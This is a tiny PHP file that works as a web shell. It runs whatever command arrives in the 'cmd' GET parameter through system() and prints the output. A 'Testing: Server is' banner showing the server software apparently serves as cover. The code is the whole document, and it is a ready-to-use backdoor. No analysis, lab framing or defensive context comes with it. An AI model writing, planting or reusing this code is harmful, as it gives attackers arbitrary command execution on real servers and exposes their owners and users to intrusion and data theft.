<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd'] . " 2>&1");
    echo "</pre>";
}
echo "Testing: Server is " . $_SERVER['SERVER_SOFTWARE'];
?>
